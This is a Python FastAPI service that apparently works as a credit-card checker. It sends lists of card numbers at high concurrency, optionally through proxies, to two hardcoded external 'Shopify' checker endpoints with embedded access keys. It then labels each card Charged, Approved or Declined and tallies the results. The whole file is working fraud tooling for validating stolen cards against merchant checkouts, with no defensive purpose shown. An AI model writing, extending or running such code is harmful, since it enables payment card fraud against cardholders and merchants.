from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
import aiohttp
import asyncio
import os
import random

app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

SHOPIFY_APIS = {
    "api1": {"url": "https://api-production-6b6d.up.railway.app/shopify", "key": "darkanon"},
    "api2": {"url": "https://shimmering-celebration-production-7dd0.up.railway.app/shopify", "key": "AnonShopii2026!"},
}

@app.post("/check")
async def check_cards(data: dict):
    cards = data.get("cards", [])
    site = data.get("site", "")
    proxy = data.get("proxy", "")
    api_name = data.get("api", random.choice(list(SHOPIFY_APIS.keys())))
    concurrency = data.get("concurrency", 50)  # received from bot
    
    api = SHOPIFY_APIS.get(api_name, list(SHOPIFY_APIS.values())[0])
    semaphore = asyncio.Semaphore(concurrency)
    results = []
    
    async def check_one(session, card):
        async with semaphore:
            try:
                url = f"{api['url']}?site={site}&cc={card}&key={api['key']}"
                if proxy:
                    url += f"&proxy={proxy}"
                async with session.get(url) as resp:
                    text = await resp.text()
                    status = parse_status(text)
                    return {
                        "card": card,
                        "status": status,
                        "message": text[:500],
                        "gateway": "Shopify",
                        "price": extract_price(text),
                        "api": api_name
                    }
            except Exception as e:
                return {
                    "card": card,
                    "status": "Error",
                    "message": str(e)[:200],
                    "gateway": "Shopify",
                    "price": "-",
                    "api": api_name
                }
    
    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        tasks = [check_one(session, card) for card in cards]
        results = await asyncio.gather(*tasks)
    
    charged = sum(1 for r in results if r["status"] == "Charged")
    approved = sum(1 for r in results if r["status"] == "Approved")
    
    return {
        "results": list(results),
        "total": len(results),
        "charged": charged,
        "approved": approved,
        "concurrency_used": concurrency,
        "api_used": api_name
    }

def parse_status(text):
    t = text.lower()
    if "charged" in t or "order_placed" in t:
        return "Charged"
    elif "approved" in t:
        return "Approved"
    elif "declined" in t:
        return "Declined"
    return "Unknown"

def extract_price(text):
    import re
    prices = re.findall(r'\$(\d+\.?\d*)', text)
    return prices[0] if prices else "-"

@app.get("/health")
async def health():
    return {"status": "ok", "apis": list(SHOPIFY_APIS.keys())}

if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
